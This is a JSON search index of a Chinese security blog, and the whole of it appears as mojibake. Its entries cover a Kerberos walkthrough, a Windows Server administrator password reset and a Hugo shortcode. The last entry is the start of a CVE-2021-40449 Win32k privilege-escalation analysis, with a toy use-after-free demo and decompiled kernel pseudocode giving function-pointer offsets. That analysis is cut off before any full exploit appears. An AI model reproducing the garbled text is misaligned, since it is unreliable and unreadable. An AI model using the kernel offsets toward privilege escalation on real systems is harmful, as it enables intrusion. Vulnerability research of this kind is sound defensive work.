ï¼Œä»¥ä¸‹æ˜¯æˆ‘åšå®¢é¦–é¡µçš„æ—¶é—´çº¿ä»£ç ï¼š\n{{\u0026lt; timeline \u0026gt;}} {{% event title=\u0026#34;09-03è‡³09-04\u0026#34; from=\u0026#34;2022-09-03\u0026#34; to=\u0026#34;2022-09-04\u0026#34; %}} è¿™ä¸¤å¤©ï¼Œç»™hugoä¸»é¢˜å¢åŠ äº†timelineçš„shortcodeï¼Œè§[å¢åŠ timelineåŠŸèƒ½](others/add-timeline-shortcode) {{% /event %}} {{% event title=\u0026#34;08-29è‡³09-02\u0026#34; from=\u0026#34;2022-08-29\u0026#34; to=\u0026#34;2022-09-02\u0026#34; %}} å‘¨å†…å®¡è®¡äº†ä»£ç  {{% /event %}} {{\u0026lt; /timeline \u0026gt;}} é™¤äº†è¿™ä¸ªè¿˜é¡ºä¾¿ç»™åšå®¢æ–°å¢äº†åŸºäºGithub issueçš„è¯„è®ºåŠŸèƒ½ï¼Œå‚è€ƒ\rutterancã€‚\nå‚è€ƒ\nhttps://metalblueberry.github.io/post/howto/2021-02-28_hugo_timeline_shortcode/\n"},{"uri":"https://www.ch35tnut.site/zh-cn/about/","title":"å…³äºæˆ‘","tags":[],"description":"","content":"å…³äºæˆ‘ 21å¹´æ¯•ä¸šï¼Œç›®å‰åœ¨æŸå®‰å…¨å‚å•†å·¥ä½œï¼Œä¸»è¦ç ”ç©¶äºŒè¿›åˆ¶ã€‚\nå¸Œæœ›å¯ä»¥æŒä¹‹ä»¥æ’åšå®‰å…¨ç ”ç©¶ã€‚\né»‘å®¢ç²¾ç¥ï¼šOpen, Share, Free\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/","title":"è®¤è¯åŸç†","tags":[],"description":"","content":"è®¤è¯åŸç† ä¸€ã€Kerberosæ¦‚å¿µ Kerberosæ˜¯è®¡ç®—æœºç½‘ç»œæˆæƒåè®®ï¼Œç”¨äºåœ¨éå®‰å…¨ç½‘ç»œä¸­ï¼Œå¯¹ä¸ªäººé€šä¿¡è¿‡ç¨‹ä¸­ç”¨å®‰å…¨çš„æ‰‹æ®µè¿›è¡Œèº«ä»½è®¤è¯ã€‚å…¶ä¸­å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯èƒ½å¤Ÿç›¸äº’è®¤è¯ï¼Œè¯†åˆ«å¯¹æ–¹èº«ä»½ã€‚Kerberosæ˜¯ç¬¬ä¸‰æ–¹è®¤è¯ï¼Œä¾èµ–äºç¬¬ä¸‰æ–¹æœåŠ¡å™¨å¯¹å½¼æ­¤è¿›è¡Œèº«ä»½éªŒè¯ï¼ŒKerberosæœåŠ¡å™¨æœ¬èº«æˆä¸ºKDCã€‚ ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š\nKerberosçŸ¥é“ç”¨æˆ·å’Œé›†ç¾¤å†…æœåŠ¡ä»¥åŠå„è‡ªçš„å¯†ç æ•°æ®åº“ ASéªŒè¯ç”¨æˆ·èº«ä»½ï¼ŒéªŒè¯é€šè¿‡å°±ä¼šè¿”å›ç»™Clientç«¯ä¸€ä¸ªTGT Clienté€šè¿‡TGTå‘TGSè·å–ST æœåŠ¡éªŒè¯STæœ‰æ•ˆæ€§ï¼Œå¦‚æœæœ‰æ•ˆåˆ™Clientå¯ä»¥è®¿é—®æœåŠ¡ äºŒã€Kerberosåè¯è§£é‡Š ASï¼ˆAuthentication Serverï¼‰è®¤è¯æœåŠ¡å™¨ KDCï¼ˆKey Distribution Centerï¼‰å¯†é’¥åˆ†å‘ä¸­å¿ƒ TGTï¼ˆTicket Granting Ticketï¼‰ç¥¨æ®æˆæƒç¥¨æ®ï¼Œç»™ç¥¨æ®æˆæƒçš„ç¥¨æ® TGSï¼ˆTicket Granting Serviceï¼‰ç¥¨æ®æˆæƒæœåŠ¡ SSï¼ˆService Serverï¼‰æœåŠ¡æä¾›æœåŠ¡å™¨ STï¼ˆServer Ticketï¼‰æœåŠ¡ç«¯ç¥¨æ® ä¸€èˆ¬KDCåŒæ—¶åŒ…å«ASå’ŒTGS\nä¸‰ã€KerberoséªŒè¯è¿‡ç¨‹ Clientç™»å½•ï¼Œç”¨æˆ·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œä¼šç”¨å•å‘å‡½æ•°æ ¹æ®å¯†ç ç”Ÿæˆå®¢æˆ·ç«¯å¯†é’¥ï¼ˆClient Secret Keyï¼‰\nClientå‘ASå‘é€Aæ¶ˆæ¯è¯·æ±‚TGT\nAæ¶ˆæ¯å†…å®¹ ç”¨æˆ·å è¯·æ±‚æœåŠ¡åç§°ï¼Œè¿™é‡Œæ˜¯TGS ç½‘ç»œåœ°å€ è¯·æ±‚TGTçš„ç”Ÿå‘½å‘¨æœŸ è¯¥æ¶ˆæ¯ä¸ä¼šåŠ å¯†ï¼Œä¹Ÿä¸ä¼šå‘é€å¯†ç æˆ–è€…å¯†ç ç”Ÿæˆçš„å¯†é’¥ ASæ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ASç”¨æˆ·åæ•°æ®åº“å†…ï¼Œå¹¶ä½¿ç”¨æ•°æ®åº“ä¸­ç”¨æˆ·å¯†ç ç”Ÿæˆçš„NTLMå“ˆå¸Œè§£å¯†å®¢æˆ·ç«¯æ¶ˆæ¯\nå¦‚æœæ•°æ®åº“å†…æœ‰è¯¥ç”¨æˆ·ååˆ™éšæœºç”ŸæˆTGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ï¼ŒåŒæ—¶ç»™Clientç«¯å‘é€ä¸¤æ¡æ¶ˆæ¯\nBæ¶ˆæ¯å†…å®¹ç”¨å®¢æˆ·ç«¯å¯†é’¥åŠ å¯† TGSåç§° æ—¶é—´æˆ³ ç”Ÿå‘½å‘¨æœŸ TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ Cæ¶ˆæ¯å†…å®¹ï¼ˆTGTï¼‰ç”¨TGSå¯†é’¥ï¼ˆTGS Secret Keyï¼‰åŠ å¯† ç”¨æˆ·å TGSåç§° æ—¶é—´æˆ³ ç”¨æˆ·ç½‘ç»œåœ°å€ ç”Ÿå‘½å‘¨æœŸ TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ Clientç”¨é€šè¿‡å¯†ç ç”Ÿæˆçš„å®¢æˆ·ç«¯å¯†é’¥è§£å¯†Bæ¶ˆæ¯ï¼Œå¦‚æœå¯†ç æ­£ç¡®åˆ™å¯ä»¥å¾—åˆ°TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ï¼Œå°†Cæ¶ˆæ¯ï¼ˆTGTï¼‰å­˜å‚¨åœ¨æœ¬åœ°å‡­æ®ç¼“å­˜å†…ã€‚\nClientå‘TGSè¯·æ±‚STï¼ŒæœŸé—´éœ€è¦å‘TGSå‘é€ä¸¤æ¡æ¶ˆæ¯æ˜æ–‡\nDæ¶ˆæ¯å†…å®¹ æƒ³è¦è¯·æ±‚çš„æœåŠ¡IDå³SS ç”Ÿå‘½å‘¨æœŸ TGT Eæ¶ˆæ¯å†…å®¹ä½¿ç”¨TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰åŠ å¯†å³èº«ä»½éªŒè¯å™¨ ç”¨æˆ·å æ—¶é—´æˆ³ TGSéªŒè¯Clientè¯·æ±‚æœåŠ¡æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨åˆ™è¿›å…¥ä¸‹ä¸€æ­¥ã€‚\nTGSæå–Dæ¶ˆæ¯å†…çš„TGTï¼Œç”¨TGSå¯†é’¥è§£å¯†ï¼ˆTGS Secret Keyï¼‰ï¼Œä»ä¸­æå–TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ï¼Œå†ç”¨TGSä¼šè¯å¯†é’¥è§£å¯†Eå¾—åˆ°ç”¨æˆ·åå’Œæ—¶é—´æˆ³ï¼Œç°åœ¨TGSå¾—åˆ°äº†ç”¨æˆ·åå’Œæ¶ˆæ¯Eçš„æ—¶é—´æˆ³ï¼Œä»¥åŠæ¶ˆæ¯Cçš„ç”¨æˆ·åå’Œæ—¶é—´æˆ³\næ¯”è¾ƒä¸¤ä¸ªç”¨æˆ·åå’Œæ—¶é—´æˆ³ æ£€æŸ¥TGTç”Ÿå‘½å‘¨æœŸæ˜¯å¦è¿‡æœŸ æ£€æŸ¥èº«ä»½éªŒè¯å™¨ï¼ˆEæ¶ˆæ¯ï¼‰æ˜¯å¦åœ¨ç¼“å­˜å†…(å­˜ç–‘) TGSç”ŸæˆéšæœºæœåŠ¡ä¼šè¯ï¼ˆservice session keyï¼‰å¯†é’¥ï¼Œå¹¶å‘é€ä¸¤æ¡æ¶ˆæ¯ç»™Client\nFæ¶ˆæ¯å†…å®¹ç”¨æœåŠ¡å¯†é’¥(Service Secret Key)åŠ å¯† ç”¨æˆ·å æœåŠ¡å æ—¶é—´æˆ³ ç½‘ç»œåœ°å€ ç”Ÿå‘½å‘¨æœŸ æœåŠ¡ä¼šè¯å¯†é’¥ Gæ¶ˆæ¯å†…å®¹ç”¨TGSä¼šè¯å¯†é’¥åŠ å¯† æœåŠ¡å æ—¶é—´æˆ³ ç”Ÿå‘½å‘¨æœŸ æœåŠ¡ä¼šè¯å¯†é’¥ å› ä¸ºClientæœ‰TGSä¼šè¯å¯†é’¥æ‰€ä»¥å¯ä»¥è§£å¯†æ¶ˆæ¯Gå¾—åˆ°æœåŠ¡ä¼šè¯å¯†é’¥ï¼ˆservice session keyï¼‰\nå®¢æˆ·ç«¯å’ŒSSè¿æ¥ï¼Œå‘é€ä¸¤æ¡æ¶ˆæ¯\næ¶ˆæ¯Hç”¨æœåŠ¡ä¼šè¯å¯†é’¥åŠ å¯†å†…å®¹èº«ä»½éªŒè¯å™¨ï¼š ç”¨æˆ·å æ—¶é—´æˆ³ æ¶ˆæ¯L å³æ¶ˆæ¯F SSæ”¶åˆ°è¯·æ±‚ï¼Œç”¨æœåŠ¡å¯†é’¥è§£å¯†æ¶ˆæ¯Iå³æ¶ˆæ¯Få¾—åˆ°æœåŠ¡ä¼šè¯å¯†é’¥åŠç”¨æˆ·åæ—¶é—´æˆ³ç­‰ä¿¡æ¯ï¼Œå†ç”¨æœåŠ¡ä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Hå¾—åˆ°ç”¨æˆ·åå’Œæ—¶é—´æˆ³\nSSè¿›è¡Œèº«ä»½éªŒè¯\næ¯”è¾ƒæ¶ˆæ¯Hå†…ç”¨æˆ·åå’Œæ¶ˆæ¯Få†…çš„ç”¨æˆ·å æ¯”è¾ƒæ¶ˆæ¯Hå’Œæ¶ˆæ¯Få†…çš„æ˜¯æ—¶é—´æˆ³ æ£€æŸ¥æ¶ˆæ¯Få†…ç”Ÿå‘½å‘¨æœŸ æ£€æŸ¥èº«ä»½éªŒè¯å™¨æ˜¯å¦åœ¨ç¼“å­˜å†… SSå‘ClientéªŒè¯èº«ä»½ï¼Œå‘å…¶å‘é€æ¶ˆæ¯\næ¶ˆæ¯Jä½¿ç”¨æœåŠ¡ä¼šè¯å¯†é’¥åŠ å¯†èº«ä»½éªŒè¯å™¨ æœåŠ¡ID æ—¶é—´æˆ³ï¼ˆåœ¨æ¶ˆæ¯Hå†…çš„æ—¶é—´æˆ³ï¼‰ å®¢æˆ·ç«¯æ”¶åˆ°SSçš„èº«ä»½éªŒè¯å™¨æ¶ˆæ¯ï¼ˆJï¼‰ï¼Œä½¿ç”¨ç¼“å­˜å†…çš„æœåŠ¡ä¼šè¯å¯†é’¥è¿›è¡Œè§£å¯†å¾—åˆ°æœåŠ¡IDåŠæ—¶é—´æˆ³ï¼Œå¹¶éªŒè¯æ˜¯å¦æœ‰æ•ˆ\nå‚è€ƒé“¾æ¥\nhttps://www.vanimpe.eu/2017/05/26/kerberos-made-easy/ https://zh.wikipedia.org/wiki/Kerberos http://www.nosqlnotes.com/technotes/kerberos-protocol/ https://juejin.im/post/6844903955416219661\nç®€åŒ–æ¨¡å‹ Clientå‘ASå‘é€æ˜æ–‡æ¶ˆæ¯ï¼Œç”³è¯·è®¿é—®çš„æœåŠ¡ ASæ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨æœ¬åœ°æ•°æ®åº“ä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›ä¸¤æ¡æ¶ˆæ¯ Aï¼šClient/TGSä¼šè¯å¯†é’¥(Client/TGS Session Key)ç”¨äºClientå’ŒTGSé€šä¿¡ï¼Œé€šè¿‡ç”¨æˆ·å¯†é’¥åŠ å¯† Bï¼šTGTï¼ˆåŒ…å«Client/TGSä¼šè¯å¯†é’¥ã€ç”¨æˆ·ã€ç”¨æˆ·ç½‘ç»œåœ°å€ã€TGTæœ‰æ•ˆæœŸï¼‰ï¼Œé€šè¿‡TGSå¯†é’¥åŠ å¯† Clientæ”¶åˆ°æ¶ˆæ¯ABï¼Œç”¨è‡ªå·±çš„ç”¨æˆ·å¯†é’¥è§£å¯†æ¶ˆæ¯Aå¾—åˆ°å’ŒTGSé€šä¿¡çš„å¯†é’¥TGSä¼šè¯å¯†é’¥ Clientå‘TGSè¯·æ±‚æœåŠ¡ï¼Œå‘é€ä¸¤æ¡æ¶ˆæ¯ Cï¼šæ¶ˆæ¯Bå’Œç”³è¯·çš„æœåŠ¡IDï¼ˆæ˜æ–‡ï¼‰ Dï¼šè®¤è¯ç¬¦ï¼ˆåŒ…æ‹¬ç”¨æˆ·IDã€æ—¶é—´æˆ³ï¼‰é€šè¿‡(Client/TGS Session Key)åŠ å¯† TGSæ‹¿åˆ°æœåŠ¡IDæ£€æŸ¥æ˜¯å¦æœ‰è¯¥æœåŠ¡ï¼Œå¦‚æœæœ‰è¯¥æœåŠ¡åˆ™ç”¨TGSå¯†é’¥è§£å¯†æ¶ˆæ¯Bå¾—åˆ°(Client/TGS Session Key)å†ç”¨TGSä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Då¾—åˆ°ç”¨æˆ·IDã€æ—¶é—´æˆ³ï¼Œä¸TGTå†…çš„ç”¨æˆ·IDå’Œæ—¶é—´æˆ³æ¯”å¯¹éªŒè¯æœ‰æ•ˆæ€§ã€‚ é€šè¿‡ä¹‹åTGSè¿”å›ä¸¤æ¡æ¶ˆæ¯ç»™Client Eï¼šSTï¼ˆSSä¼šè¯å¯†é’¥ã€ç”¨æˆ·IDã€ç”¨æˆ·ç½‘ç»œåœ°å€ã€æœ‰æ•ˆæœŸï¼‰é€šè¿‡SSå¯†é’¥åŠ å¯† Fï¼šSSä¼šè¯å¯†é’¥ï¼Œé€šè¿‡TGSä¼šè¯å¯†é’¥åŠ å¯† Clienté€šè¿‡TGSä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Få¾—åˆ°SSä¼šè¯å¯†é’¥ Clientç»™SSå‘é€ä¸¤æ¡æ¶ˆæ¯ Gï¼šå³æ¶ˆæ¯E Hï¼šè®¤è¯ç¬¦ï¼ŒåŒ…å«ç”¨æˆ·IDï¼Œæ—¶é—´æˆ³ï¼Œé€šè¿‡SSä¼šè¯å¯†é’¥åŠ å¯† SSæ”¶åˆ°ä¸¤æ¡æ¶ˆæ¯ä¹‹åç”¨SSå¯†é’¥è§£å¯†æ¶ˆæ¯Gï¼ˆEï¼‰å¾—åˆ°SSä¼šè¯å¯†é’¥ï¼Œåœ¨é€šè¿‡ä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Hå¾—åˆ°ç”¨æˆ·IDã€æ—¶é—´æˆ³ç­‰ä¿¡æ¯ï¼Œå¦‚æœå’Œæ¶ˆæ¯Gï¼ˆEï¼‰å†…çš„æ—¶é—´æˆ³å’Œç”¨æˆ·IDæ¯”å¯¹ï¼Œé€šè¿‡åˆ™è¿”å›æ¶ˆæ¯ç»™Client Iï¼šæ¶ˆæ¯Hå†…çš„æ—¶é—´æˆ³ï¼Œé€šè¿‡SSä¼šè¯å¯†é’¥åŠ å¯† Clientæ”¶åˆ°æ¶ˆæ¯ä¹‹åç”¨SSä¼šè¯å¯†é’¥è§£å¯†å¾—åˆ°æ—¶é—´æˆ³ï¼Œå¹¶éªŒè¯ï¼Œé€šè¿‡åˆ™å¯ä»¥å‘SSå‘é€è¯·æ±‚ã€‚ "},{"uri":"https://www.ch35tnut.site/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/","title":"åœ¨Windows server 2019ä¸Šé‡ç½®å¯†ç ","tags":[],"description":"","content":"é‡ç½®windows server 2019çš„administratorå¯†ç  ä¹‹å‰åœ¨Vmwareä¸Šçš„Windows server 2019çš„Administratorå¯†ç å¿˜è®°äº†ï¼Œä½¿ç”¨ç½‘ä¸Šçš„æ–¹æ³•æ—¶æ‰¾ä¸åˆ°ç”¨PEå¯åŠ¨ç³»ç»Ÿçš„åŠæ³•ï¼Œæ— å¥ˆåªèƒ½ä½¿ç”¨å…¶ä»–åŠæ³•ã€‚å†™æ­¤æ–‡è®°å½•ä¸€ä¸‹ã€‚\nè®¾ç½®CD/DVD é¦–å…ˆåœ¨è™šæ‹Ÿæœº-è®¾ç½®çš„ç¡¬ä»¶é€‰é¡¹å¡ä¸‹é¢çš„CD/DVDè®¾ç½®ä¸ºä½¿ç”¨ISOæ˜ åƒæ–‡ä»¶å¹¶æ‰¾åˆ°windows server 2019é•œåƒä½ç½®ï¼Œå¦‚ä¸‹å›¾\nä¹‹åé€‰æ‹©è™šæ‹Ÿæœº-ç”µæº-å¼€æœºæ—¶æ‰“å¼€å›ºä»¶å¯åŠ¨è™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºå°±ä¼šè¿›å…¥BIOSï¼Œåœ¨BIOSé‡Œé€‰æ‹©CD/DVDå¯åŠ¨ï¼Œå³ä¼šè¿›å…¥ä¸‹å›¾ã€‚\nå‚è€ƒé“¾æ¥\nhttps://www.osradar.com/how-to-reset-password-administrator-on-windows-server-2019/\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/","title":"CVE-2021-40449 åˆ†æ","tags":[],"description":"","content":"CVE-2021-40449 Win32kææƒæ¼æ´åŠPOCåˆ†æ èƒŒæ™¯ CVE-2021-40449æ˜¯å¡å·´æ–¯åŸºå®éªŒå®¤åœ¨2021å¹´8æœˆä¸‹æ—¬åˆ°9æœˆä¸Šæ—¬åœ¨WindowsæœåŠ¡å™¨ä¸Šæ•è·çš„æ¶æ„æ ·æœ¬åˆ©ç”¨çš„ææƒæ¼æ´ï¼Œè¯¥æ¼æ´å­˜åœ¨äºwin32kfull.sysé©±åŠ¨å†…ï¼Œåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥åœ¨windowsä¸­å®Œæˆä»usersåˆ°systemçš„æƒé™æå‡ã€‚\nåŸºæœ¬æ¦‚å¿µ å†…æ ¸å¯¹è±¡ï¼šå†…æ ¸å¯¹è±¡å³åœ¨å†…æ ¸ç©ºé—´å­˜åœ¨çš„å¯¹è±¡ï¼Œåªèƒ½ç”±å†…æ ¸åˆ†é…ï¼Œå†…æ ¸è®¿é—®ã€‚\nå†…æ ¸å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼šåœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œå¯èƒ½æœ‰å¤šä¸ªè¿›ç¨‹è®¿é—®åŒä¸€ä¸ªå†…æ ¸å¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰è¿›ç¨‹éœ€è¦ä½¿ç”¨è¯¥å¯¹è±¡å†…æ ¸å°±åº”è¯¥é‡Šæ”¾è¯¥å¯¹è±¡ï¼Œæ‰€ä»¥ä¸ºäº†å‡†ç¡®çš„é‡Šæ”¾è¯¥å¯¹è±¡å°±æœ‰äº†å¼•ç”¨è®¡æ•°ã€‚å½“å†…æ ¸å¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œå¼•ç”¨è®¡æ•°è¢«æ ‡è®°ä¸º1ï¼Œè°ƒç”¨CloseHandle()æ—¶å†…æ ¸å¯¹è±¡çš„å¼•ç”¨è®¡æ•°å°±-1ï¼Œè¿™å¯ä»¥ç±»æ¯”Java GCçš„å¼•ç”¨è®¡æ•°æ³•ï¼š\nåœ¨å¯¹è±¡ä¸­æ·»åŠ ä¸€ä¸ªå¼•ç”¨è®¡æ•°å™¨ï¼Œæ¯å½“ä¸€ä¸ªåœ°æ–¹å¼•ç”¨å®ƒæ—¶ï¼Œè®¡æ•°å™¨å°±åŠ ä¸€ï¼›å½“å¼•ç”¨å¤±æ•ˆæ—¶ï¼Œè®¡æ•°å™¨å€¼å°±å‡ä¸€ï¼›ä»»ä½•æ—¶åˆ»è®¡æ•°å™¨ä¸ºé›¶çš„å¯¹è±¡å°±æ˜¯ä¸å¯èƒ½å†è¢«ä½¿ç”¨çš„ã€‚\nå¥æŸ„ï¼šç”±äºå†…æ ¸å¯¹è±¡åªèƒ½ç”±å†…æ ¸åˆ†é…ã€è®¿é—®ã€ä¿®æ”¹ï¼Œå½“ring 3å±‚çš„åº”ç”¨ç¨‹åºæƒ³è¦æ“ä½œè¿™äº›å†…æ ¸å¯¹è±¡çš„æ—¶å€™ï¼Œå¹¶ä¸èƒ½ç›´æ¥æ“æ§å†…æ ¸å¯¹è±¡ã€‚å½“å†…æ ¸å¯¹è±¡åˆ›å»ºå¥½åï¼Œæ“ä½œç³»ç»Ÿä¼šä½¿ç”¨ä¸€ä¸ªå¥æŸ„æ¥æ ‡è¯†è¯¥å¯¹è±¡å¹¶è¿”å›ç»™åº”ç”¨ç¨‹åºï¼Œåº”ç”¨ç¨‹åºé€šè¿‡æ“ä½œç³»ç»Ÿæä¾›çš„ring 3å±‚APIæ¥æ“ä½œå¥æŸ„ï¼Œring3å±‚APIç»è¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸ã€‚åœ¨å†…æ ¸å¤„å¥æŸ„å¯¹åº”ç€å…·ä½“çš„å†…æ ¸å¯¹è±¡ï¼Œè¿™æ ·ring3å±‚çš„åº”ç”¨ç¨‹åºå°±å¯ä»¥é€šè¿‡æ“ä½œå¥æŸ„æ¥é—´æ¥æ“ä½œå†…æ ¸å¯¹è±¡ã€‚\nå¥æŸ„è¡¨ï¼šå½“ä¸€ä¸ªè¿›ç¨‹åˆå§‹åŒ–çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šç»™è¯¥è¿›ç¨‹åˆ†é…ä¸€ä¸ªå¥æŸ„è¡¨ï¼Œå½“è¿›ç¨‹åˆ›å»ºå†…æ ¸å¯¹è±¡çš„æ—¶å€™ï¼Œå†…æ ¸åˆ›å»ºå¯¹åº”å†…æ ¸å¯¹è±¡ï¼Œå¹¶éå†è¯¥è¿›ç¨‹çš„å¥æŸ„è¡¨ï¼Œåœ¨å¥æŸ„è¡¨çš„ç©ºé—²ä½ç½®è®¾ç½®å†…æ ¸å¯¹è±¡ã€å¯¹è±¡æŒ‡é’ˆç­‰ï¼Œå¹¶è·å–è¯¥ä½ç½®çš„ç´¢å¼•ï¼Œä½œä¸ºè¿›ç¨‹åˆ›å»ºå¯¹è±¡çš„å‡½æ•°çš„è¿”å›å€¼ï¼Œå³ä¸ºå¥æŸ„ã€‚\nhttps://www.cnblogs.com/MisterXu/p/10846918.html\nDCï¼šæ˜¯ä¸€ä¸ªå†…æ ¸å¯¹è±¡ï¼Œå…¨ç§°device contextï¼Œè®¾å¤‡ä¸Šä¸‹æ–‡å¯¹è±¡\nHDCï¼šDCå¯¹è±¡çš„å¥æŸ„ã€‚\né‡Šæ”¾åé‡ç”¨ï¼šæŒ‡ä¸€ä¸ªå†…å­˜ç©ºé—´è¢«æ“ä½œç³»ç»Ÿé‡Šæ”¾åï¼Œå†…å­˜ç©ºé—´å˜ä¸ºç©ºé—²çŠ¶æ€ï¼Œå¦‚æœç”¨æˆ·åœ¨è¿™ä¸€åˆ»ç”³è¯·å†…å­˜ï¼Œæ“ä½œç³»ç»Ÿä¼šä¼˜å…ˆåˆ†é…åˆšé‡Šæ”¾çš„å†…å­˜ï¼Œåˆ™ç”¨æˆ·å¤§æ¦‚ç‡å¯ä»¥ç”³è¯·åˆ°åˆšåˆšé‡Šæ”¾çš„å†…å­˜å¹¶ä¿®æ”¹è¯¥å†…å­˜ç©ºé—´çš„å†…å®¹ã€‚å¦‚æœåœ¨é‡Šæ”¾ç©ºé—´ä¹‹å‰æœ‰æŒ‡é’ˆæŒ‡å‘è¯¥ç©ºé—´ï¼Œåœ¨é‡Šæ”¾ç©ºé—´ä¹‹åæŒ‡é’ˆå¹¶æœªæŒ‰ç…§ç†æƒ³çŠ¶æ€ç½®ä¸ºNULLï¼Œç”±äºé‡Šæ”¾åå¯ä»¥é‡æ–°ç”³è¯·è¯¥å†…å­˜å¹¶ä¿®æ”¹å†…å­˜å†…å®¹ï¼Œåç»­å¦‚æœç»§ç»­ä½¿ç”¨è¯¥æŒ‡é’ˆï¼Œä½†å†…å­˜å†…å†…å®¹å¹¶ä¸æ˜¯é¢„æœŸçš„é‡Šæ”¾ä¹‹å‰çš„å†…å®¹ï¼Œåˆ™ä¼šäº§ç”Ÿéé¢„æœŸè¡Œä¸ºã€‚\negï¼š\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void method(); void badMethod(); // å®šä¹‰å‡½æ•°æŒ‡é’ˆ typedef void (*function)(); class test { public: function p; test() { } }; int main() { // new testå¯¹è±¡ test *t = new test(); test *p = t; t-\u0026gt;p = method; p-\u0026gt;p(); // é‡Šæ”¾tæŒ‡å‘çš„testå¯¹è±¡çš„ç©ºé—´ delete t; test *pt; for (size_t i = 0; i \u0026lt; 10000; i++) { // å ç”¨åˆšé‡Šæ”¾çš„å¯¹è±¡çš„å†…å­˜ç©ºé—´ pt = (test *)malloc(sizeof(test)); // å°†ç”³è¯·çš„ç©ºé—´å½“ä½œtestå¯¹è±¡ï¼Œå¹¶å°†å¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆè®¾ç½®ä¸ºæ¶æ„å‡½æ•°åœ°å€ pt-\u0026gt;p = badMethod; } // è¿™é‡ŒåŸæ„æƒ³è¦è°ƒç”¨methodå‡½æ•°ï¼Œä½†æ˜¯å®é™…è°ƒç”¨äº†badMethodå‡½æ•° printf(\u0026#34;ç¬¬äºŒæ¬¡è°ƒç”¨\\n\u0026#34;); p-\u0026gt;p(); return 0; } void method() { printf(\u0026#34;method\\n\u0026#34;); } void badMethod() { printf(\u0026#34;bad method\\n\u0026#34;); } æ¼æ´å½¢æˆåˆ†æ è¯¥æ¼æ´äº§ç”Ÿäºwin32kfull!GreResetDCInternalå‡½æ•°ä¸­ï¼Œè¯¥å‡½æ•°å†…ä¼šè·å–DCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆï¼Œå¹¶æ‰§è¡Œè¯¥å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°ï¼Œä½†å¹¶æœªæ£€æŸ¥DCå¯¹è±¡æ˜¯å¦å¼‚å¸¸ã€‚æ‰€ä»¥å¦‚æœå¯ä»¥åœ¨è°ƒç”¨å‡½æ•°æŒ‡é’ˆä¹‹å‰é‡Šæ”¾DCå¯¹è±¡ï¼Œå¹¶é‡æ–°ç”³è¯·è¯¥å¯¹è±¡çš„å†…å­˜ç©ºé—´ï¼Œé€šè¿‡æ„é€ å†…å­˜å¸ƒå±€ï¼Œä¿®æ”¹åŸDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆæŒ‡å‘å…¶ä»–ä»»æ„å†…æ ¸å‡½æ•°ï¼Œå°±å¯ä»¥åœ¨win32kfull!GreResetDCInternalå†…å®ç°ä»»æ„å†…æ ¸å‡½æ•°è°ƒç”¨ã€‚\næ ¹æ®ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥ç®—å‡ºDCOå¯¹è±¡å’ŒDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆçš„å…³ç³»ï¼šfunction pointer=* (* (DCO +0x30)+0xad0)ï¼Œå…¶ä¸­DCO +0x30å³æŒ‡å‘DCå¯¹è±¡çš„æŒ‡é’ˆ\nv10 = *(_QWORD *)(v8 + 48);\nv15 *= * (void (_fastcall * * )(QWORD, _QWORD))(*v10 + 2768);\n__int64 __usercall GreResetDCInternal@\u0026lt;rax\u0026gt;(HDC a1@\u0026lt;rcx\u0026gt;, __int64 a2@\u0026lt;rdx\u0026gt;, int *a3@\u0026lt;r8\u0026gt;) { __int64 v24; // [rsp+50h] [rbp-20h] __int64 v25; // [rsp+60h] [rbp-10h] DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v25, a1); // åˆ©ç”¨æ„é€ å‡½æ•°ä»HDCåˆ›å»ºDCOBJå¯¹è±¡ v8 = v25; Â·Â·Â·Â·Â·Â·Â·Â·Â·Â· v10 = *(_QWORD *)(v8 + 48);\t// èµ‹å€¼ *(_QWORD *)(v10 + 1736) = 0i64; v24 = v11; Â·Â·Â·Â·Â·Â·Â· v9 = *(_QWORD *)(v25 + 512) != 0i64; v12 = *(_DWORD *)(v25 + 120) \u0026gt; 0; Â·Â·Â·Â·Â·Â·Â· v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// åˆ›å»ºæ–°çš„DCå¯¹è±¡ï¼Œè¿”å›å¯¹åº”çš„HDCå¥æŸ„ if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); 